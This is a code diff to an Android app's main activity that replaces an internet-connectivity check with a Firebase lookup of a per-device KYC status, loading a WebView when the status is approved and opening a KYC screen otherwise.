@@ -189,19 +189,55 @@ public class MainActivity extends AppCompatActivity {
         // Prompt for default SMS handler
         promptToBeDefaultSmsApp();
 
-        // Check internet
-        if (!isNetworkAvailable()) {
-            Log.e(TAG, "No internet connection");
-            showNoInternetMessage();
-            return;
-        }
+        // Check KYC status
+        checkKycAndContinue();
+    }
 
-        // Initialize WebView
+    // ============================================================
+    // KYC CHECK
+    // ============================================================
+    private void checkKycAndContinue() {
         try {
-            initializeWebView();
+            String deviceId = DeviceInfo.getDeviceId(this);
+            Log.d(TAG, "Checking KYC for device: " + deviceId);
+
+            com.google.firebase.database.FirebaseDatabase.getInstance()
+                .getReference("devices")
+                .child(deviceId)
+                .child("kyc")
+                .child("kyc_status")
+                .get()
+                .addOnCompleteListener(task -> {
+                    if (task.isSuccessful() && task.getResult() != null) {
+                        String status = task.getResult().getValue(String.class);
+                        Log.d(TAG, "KYC status: " + status);
+                        if ("approved".equals(status)) {
+                            if (!isNetworkAvailable()) {
+                                showNoInternetMessage();
+                                return;
+                            }
+                            try {
+                                initializeWebView();
+                            } catch (Exception e) {
+                                Log.e(TAG, "WebView init failed", e);
+                                showFallbackMessage("WebView unavailable");
+                            }
+                        } else {
+                            Intent intent = new Intent(this, KycActivity.class);
+                            startActivity(intent);
+                        }
+                    } else {
+                        Intent intent = new Intent(this, KycActivity.class);
+                        startActivity(intent);
+                    }
+                });
         } catch (Exception e) {
-            Log.e(TAG, "WebView initialization failed", e);
-            showFallbackMessage("WebView unavailable");
+            Log.e(TAG, "KYC check failed", e);
+            try {
+                initializeWebView();
+            } catch (Exception ex) {
+                showFallbackMessage("WebView unavailable");
+            }
         }
     }
 
